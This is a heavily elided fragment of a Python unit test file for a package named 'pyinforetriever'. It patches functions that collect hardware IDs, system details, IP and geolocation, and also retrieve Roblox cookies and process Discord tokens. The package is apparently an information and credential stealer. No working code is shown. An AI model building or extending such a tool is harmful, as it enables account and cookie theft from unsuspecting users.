...
from src.pyinforetriever import misc, computer, discord, browser_cookies, roblox

class TestSystemInfo(unittest.TestCase):

    @patch('src.pyinforetriever.computer.gethwid')
    ...
    @patch('src.pyinforetriever.computer.getuser')
    ...
    @patch('src.pyinforetriever.computer.getcpuinfo')
    ...
    @patch('src.pyinforetriever.computer.getgpuinfo')
    ...
    @patch('src.pyinforetriever.computer.getraminfo')
    ...
    @patch('src.pyinforetriever.computer.getosinfo')
    ...
    @patch('src.pyinforetriever.computer.getdiskinfo')
    ...
    @patch('src.pyinforetriever.computer.getbatteryinfo')
    ...
    @patch('src.pyinforetriever.computer.getmotherboardinfo')
    ...
    @patch('src.pyinforetriever.computer.getuptime')
    ...
    @patch('src.pyinforetriever.misc.getip')
    ...
    @patch('src.pyinforetriever.misc.getgeo')
    ...
    @patch('src.pyinforetriever.misc.getallinfo')
    ...
    @patch('src.pyinforetriever.roblox.retrieveCookie')
    ...
    @patch('src.pyinforetriever.discord.process_token')
    ...
    @patch('src.pyinforetriever.discord.get_common_infos')
